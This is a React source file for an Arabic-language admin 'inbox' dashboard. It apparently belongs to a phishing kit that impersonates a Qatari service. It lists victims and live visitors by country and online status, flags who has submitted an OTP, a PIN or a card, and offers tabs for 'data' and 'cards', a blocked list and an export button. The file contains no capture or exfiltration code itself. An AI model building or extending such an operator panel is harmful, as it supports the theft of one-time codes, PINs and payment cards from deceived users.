import React, { useEffect, useState } from "react";
import { 
  Search,
  MessageSquare,
  Phone,
  CreditCard,
  Shield,
  Download,
  AlertTriangle,
  Globe,
  User,
  Mail,
  Calendar
} from "lucide-react";
import { cn } from "@/lib/utils";
import { api, User as UserType, Visitor, Application, InboxData } from "@/lib/api";
import { useWebSocket } from "@/hooks/useWebSocket";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { useLocation } from "wouter";
import { formatDistanceToNow } from "date-fns";
import { ar } from "date-fns/locale";

interface InboxEntry {
  id: string;
  name: string;
  email: string;
  country: string;
  timeAgo: string;
  hasOTP: boolean;
  hasPIN: boolean;
  hasCard: boolean;
  isOnline: boolean;
  phone?: string;
  type: "user" | "visitor";
  accountType?: string;
  paymentStatus?: string;
  nationality?: string;
  fullNameArabic?: string;
  fullNameEnglish?: string;
  createdAt?: string;
}

export default function Dashboard() {
  const [, setLocation] = useLocation();
  const { isConnected, stats: realtimeStats } = useWebSocket();
  const [entries, setEntries] = useState<InboxEntry[]>([]);
  const [selectedEntry, setSelectedEntry] = useState<InboxEntry | null>(null);
  const [activeTab, setActiveTab] = useState<"all" | "data" | "visitors" | "cards">("all");
  const [searchQuery, setSearchQuery] = useState("");
  const [stats, setStats] = useState({
    total: 0,
    data: 0,
    visitors: 0,
    cards: 0,
  });
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const fetchData = async () => {
      try {
        const inboxData = await api.getInboxData();
        
        // Transform users into inbox entries
        const userEntries: InboxEntry[] = inboxData.users.map((user: UserType) => ({
          id: user.id,
          name: user.fullNameArabic || user.fullNameEnglish || user.username,
          email: user.email,
          country: user.nationality === "qatar" ? "Qatar" : user.nationality || "غير محدد",
          timeAgo: formatDistanceToNow(new Date(user.createdAt), { addSuffix: false, locale: ar }),
          hasOTP: true,
          hasPIN: user.registrationStatus === "completed",
          hasCard: user.paymentStatus === "paid",
          isOnline: true,
          phone: user.phoneNumber || undefined,
          type: "user" as const,
          accountType: user.accountType || "citizen",
          paymentStatus: user.paymentStatus || "pending",
          nationality: user.nationality || undefined,
          fullNameArabic: user.fullNameArabic || undefined,
          fullNameEnglish: user.fullNameEnglish || undefined,
          createdAt: user.createdAt,
        }));

        // Transform visitors into inbox entries
        const visitorEntries: InboxEntry[] = inboxData.visitors.map((visitor: Visitor) => ({
          id: visitor.id,
          name: `زائر ${visitor.sessionId?.slice(0, 6) || visitor.id.slice(0, 6)}`,
          email: "",
          country: visitor.country || "غير محدد",
          timeAgo: formatDistanceToNow(new Date(visitor.visitedAt), { addSuffix: false, locale: ar }),
          hasOTP: false,
          hasPIN: false,
          hasCard: false,
          isOnline: new Date(visitor.visitedAt).getTime() > Date.now() - 5 * 60 * 1000,
          type: "visitor" as const,
        }));

        const allEntries = [...userEntries, ...visitorEntries];
        setEntries(allEntries);
        setStats(inboxData.stats);
        
        if (allEntries.length > 0) {
          setSelectedEntry(allEntries[0]);
        }
      } catch (error) {
        console.error("Failed to fetch inbox data:", error);
      } finally {
        setLoading(false);
      }
    };

    fetchData();
    
    // Refresh every 30 seconds
    const interval = setInterval(fetchData, 30000);
    return () => clearInterval(interval);
  }, []);

  // Update from WebSocket
  useEffect(() => {
    if (realtimeStats.onlineCount > 0) {
      // Could update online status here
    }
  }, [realtimeStats.onlineCount]);

  const filteredEntries = entries.filter(entry => {
    const matchesSearch = entry.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
                         entry.email.toLowerCase().includes(searchQuery.toLowerCase()) ||
                         entry.country.toLowerCase().includes(searchQuery.toLowerCase());
    const matchesTab = activeTab === "all" ||
                      (activeTab === "data" && entry.type === "user") ||
                      (activeTab === "visitors" && entry.type === "visitor") ||
                      (activeTab === "cards" && entry.hasCard);
    return matchesSearch && matchesTab;
  });

  const handleLogout = () => {
    setLocation("/admin/login");
  };

  return (
    <div className="min-h-screen bg-[#0f1629] text-white flex" dir="rtl">
      {/* Main Content */}
      <div className="flex-1 flex flex-col">
        {/* Top Stats Bar */}
        <div className="bg-[#1a2035] border-b border-gray-700 px-6 py-3 flex items-center justify-between">
          <div className="flex items-center gap-6">
            <div className="flex items-center gap-2 text-green-400">
              <span className={cn(
                "w-3 h-3 rounded-full",
                isConnected ? "bg-green-500 animate-pulse" : "bg-gray-500"
              )}></span>
              <span className="font-bold text-lg">البريد الوارد</span>
            </div>
            
            <div className="flex items-center gap-4 text-sm">
              <span className="text-gray-400">الكل: <span className="text-white font-bold">{stats.total}</span></span>
              <span className="text-gray-400">بيانات: <span className="text-white font-bold">{stats.data}</span></span>
              <span className="text-gray-400">زوار: <span className="text-white font-bold">{stats.visitors}</span></span>
              <span className="text-gray-400">بطاقات: <span className="text-green-400 font-bold">{stats.cards}</span></span>
            </div>
          </div>
          
          <div className="flex items-center gap-4">
            <Button variant="ghost" size="sm" className="text-gray-400 hover:text-white">
              <Download className="h-4 w-4 ml-2" />
              تصدير
            </Button>
            <Button variant="ghost" size="sm" className="text-gray-400 hover:text-white">
              <AlertTriangle className="h-4 w-4 ml-2" />
              المحظورة (0)
            </Button>
            <Button variant="ghost" size="sm" className="text-gray-400 hover:text-white">
              <Globe className="h-4 w-4 ml-2" />
              كل الدول
            </Button>
            <Button 
              variant="ghost" 
              size="sm" 
              className="text-red-400 hover:text-red-300"
              onClick={handleLogout}
            >
              خروج
            </Button>
          </div>
        </div>

        <div className="flex-1 flex">
          {/* Selected Entry Sidebar */}
          <div className="w-80 bg-[#1a2035] border-l border-gray-700 p-6 flex flex-col">
            {selectedEntry ? (
              <>
                {/* User Avatar */}
                <div className="text-center mb-6">
                  <div className="w-20 h-20 bg-[#2d3a5f] rounded-full mx-auto flex items-center justify-center mb-3 text-3xl font-bold text-blue-400">
                    {selectedEntry.name.charAt(0).toUpperCase()}
                  </div>
                  <h3 className="font-bold text-lg">{selectedEntry.name}</h3>
                  <p className="text-sm text-gray-400">{selectedEntry.country} •</p>
                </div>

                {/* Action Buttons */}
                <div className="flex flex-wrap gap-2 mb-6 justify-center">
                  <ActionButton icon={MessageSquare} label="الرئيسية" active />
                  <ActionButton icon={Phone} label="هاتف" />
                  <ActionButton icon={Shield} label="تفاصيل" />
                  <ActionButton icon={Shield} label="OTP" highlight={selectedEntry.hasOTP} />
                  <ActionButton icon={CreditCard} label="بطاقة" highlight={selectedEntry.hasCard} />
                </div>

                {/* User Details */}
                {selectedEntry.type === "user" ? (
                  <div className="flex-1 space-y-4 text-sm">
                    <DetailRow icon={User} label="الاسم بالعربية" value={selectedEntry.fullNameArabic || "-"} />
                    <DetailRow icon={User} label="الاسم بالإنجليزية" value={selectedEntry.fullNameEnglish || "-"} />
                    <DetailRow icon={Mail} label="البريد الإلكتروني" value={selectedEntry.email} />
                    <DetailRow icon={Phone} label="الهاتف" value={selectedEntry.phone || "-"} />
                    <DetailRow icon={Globe} label="الجنسية" value={selectedEntry.nationality || "-"} />
                    <DetailRow icon={Calendar} label="تاريخ التسجيل" value={selectedEntry.createdAt ? new Date(selectedEntry.createdAt).toLocaleDateString('ar') : "-"} />
                    
                    <div className="pt-4 border-t border-gray-700">
                      <p className="text-gray-500 mb-2">الحالة:</p>
                      <div className="flex gap-2">
                        <span className={cn(
                          "px-2 py-1 rounded text-xs",
                          selectedEntry.paymentStatus === "paid" ? "bg-green-600/20 text-green-400" : "bg-yellow-600/20 text-yellow-400"
                        )}>
                          {selectedEntry.paymentStatus === "paid" ? "تم الدفع" : "في الانتظار"}
                        </span>
                        <span className="px-2 py-1 rounded text-xs bg-blue-600/20 text-blue-400">
                          {selectedEntry.accountType === "citizen" ? "مواطن" : "زائر"}
                        </span>
                      </div>
                    </div>
                  </div>
                ) : (
                  <div className="flex-1 flex flex-col items-center justify-center text-center text-gray-500">
                    <User className="h-16 w-16 mb-4 text-gray-600" />
                    <p className="font-medium">زائر فقط</p>
                    <p className="text-sm">لا توجد بيانات مسجلة</p>
                  </div>
                )}
              </>
            ) : (
              <div className="flex-1 flex items-center justify-center text-gray-500">
                <p>اختر مستخدم للعرض</p>
              </div>
            )}
          </div>

          {/* Entry List */}
          <div className="flex-1 bg-[#131933] flex flex-col">
            {/* Search and Tabs */}
            <div className="p-4 border-b border-gray-700">
              <div className="relative mb-4">
                <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-500" />
                <Input
                  type="text"
                  placeholder="بحث..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="pr-10 bg-[#1a2035] border-gray-700 text-white placeholder:text-gray-500"
                  data-testid="input-search"
                />
              </div>
              
              {/* Tabs */}
              <div className="flex gap-2">
                <TabButton 
                  label="الكل" 
                  active={activeTab === "all"} 
                  onClick={() => setActiveTab("all")} 
                />
                <TabButton 
                  label="بيانات" 
                  active={activeTab === "data"} 
                  onClick={() => setActiveTab("data")}
                  variant="green"
                />
                <TabButton 
                  label="زوار" 
                  active={activeTab === "visitors"} 
                  onClick={() => setActiveTab("visitors")} 
                />
                <TabButton 
                  label="بطاقات" 
                  active={activeTab === "cards"} 
                  onClick={() => setActiveTab("cards")} 
                />
              </div>
            </div>

            {/* Entry List */}
            <div className="flex-1 overflow-y-auto">
              {loading ? (
                <div className="flex items-center justify-center h-full text-gray-500">
                  جاري التحميل...
                </div>
              ) : filteredEntries.length === 0 ? (
                <div className="flex items-center justify-center h-full text-gray-500">
                  لا توجد نتائج
                </div>
              ) : (
                <div className="divide-y divide-gray-700/50">
                  {filteredEntries.map((entry) => (
                    <EntryListItem
                      key={entry.id}
                      entry={entry}
                      isSelected={selectedEntry?.id === entry.id}
                      onClick={() => setSelectedEntry(entry)}
                    />
                  ))}
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

function DetailRow({ icon: Icon, label, value }: { icon: any; label: string; value: string }) {
  return (
    <div className="flex items-center gap-3">
      <Icon className="h-4 w-4 text-gray-500 flex-shrink-0" />
      <div className="flex-1">
        <p className="text-xs text-gray-500">{label}</p>
        <p className="text-white">{value}</p>
      </div>
    </div>
  );
}

function ActionButton({ icon: Icon, label, active, highlight }: { icon: any; label: string; active?: boolean; highlight?: boolean }) {
  return (
    <button
      className={cn(
        "px-3 py-1.5 rounded text-xs font-medium flex items-center gap-1 transition-colors",
        active ? "bg-blue-600 text-white" : 
        highlight ? "bg-green-600 text-white" :
        "bg-[#2d3a5f] text-gray-300 hover:bg-[#3d4a6f]"
      )}
    >
      <Icon className="h-3 w-3" />
      {label}
    </button>
  );
}

function TabButton({ label, active, onClick, variant }: { label: string; active: boolean; onClick: () => void; variant?: "green" }) {
  return (
    <button
      onClick={onClick}
      className={cn(
        "px-4 py-2 rounded-lg text-sm font-medium transition-colors",
        active 
          ? variant === "green" 
            ? "bg-green-600 text-white" 
            : "bg-blue-600 text-white"
          : "bg-[#1a2035] text-gray-400 hover:text-white"
      )}
      data-testid={`tab-${label}`}
    >
      {label}
    </button>
  );
}

function EntryListItem({ entry, isSelected, onClick }: { entry: InboxEntry; isSelected: boolean; onClick: () => void }) {
  return (
    <div
      onClick={onClick}
      className={cn(
        "flex items-center justify-between px-4 py-3 cursor-pointer transition-colors",
        isSelected ? "bg-[#1a2035]" : "hover:bg-[#1a2035]/50"
      )}
      data-testid={`entry-item-${entry.id}`}
    >
      <div className="flex items-center gap-3">
        {/* Online indicator */}
        <span className={cn(
          "w-2.5 h-2.5 rounded-full flex-shrink-0",
          entry.isOnline ? "bg-green-500" : "bg-gray-600"
        )} />
        
        <div>
          <p className="font-medium text-white">{entry.name}</p>
          <div className="flex items-center gap-2 text-xs text-gray-500">
            <span>{entry.country}</span>
            {entry.email && <span>@</span>}
          </div>
        </div>
      </div>

      <div className="flex items-center gap-3">
        {/* Status badges */}
        <div className="flex gap-1">
          {entry.hasPIN && (
            <span className="text-xs px-1.5 py-0.5 rounded bg-yellow-600/20 text-yellow-400">PIN</span>
          )}
          {entry.hasOTP && (
            <span className="text-xs px-1.5 py-0.5 rounded bg-green-600/20 text-green-400">OTP</span>
          )}
          {entry.hasCard && (
            <span className="text-xs px-1.5 py-0.5 rounded bg-blue-600/20 text-blue-400">💳</span>
          )}
        </div>
        
        <span className="text-xs text-gray-500">{entry.timeAgo}</span>
      </div>
    </div>
  );
}
